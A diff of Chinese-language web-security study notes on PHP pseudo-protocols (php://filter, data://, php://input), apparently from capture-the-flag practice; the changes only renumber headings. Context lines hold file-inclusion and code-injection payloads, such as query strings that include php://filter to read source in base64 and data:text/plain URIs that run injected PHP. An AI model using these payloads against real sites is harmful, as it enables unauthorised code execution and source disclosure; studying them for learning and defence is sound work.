@@ -10,6 +10,8 @@
 
 ### 常用php伪协议
 
+## 1. php://
+
 > PHP 伪协议是一种特殊的 PHP 特性，允许在 PHP 中通过类似 URL 的方式来访问各种资源，如文件、数据流等
 > - file://: 允许 PHP 访问本地文件系统中的文件
 > - http:// 或 https://: 允许 PHP 通过 HTTP 或 HTTPS 协议访问远程服务器上的资源
@@ -30,7 +32,7 @@ payload1：**url?c=include$_GET[1];&1=php://filter/convert.base64-encode/resourc
 
 payload2：**url?c=include$_GET[1];&1=data:text/plain,<?php echo "helloworld"?>**  
 
-### data:text/plain  
+## 2. data://  
 
 !> 注意：data:text/plain，php://input等伪协议需要在配置文件中打开**allow_url_fopen，allow_url_include**这两项  
 
@@ -50,7 +52,7 @@ url?c=include$_GET[1];&1=data:text/plain,<?php phpinfo();?>
 url?c=include$_GET[1];&1=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 ```
 
-### php://input
+## 3. php://input
 
 > 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行  
 
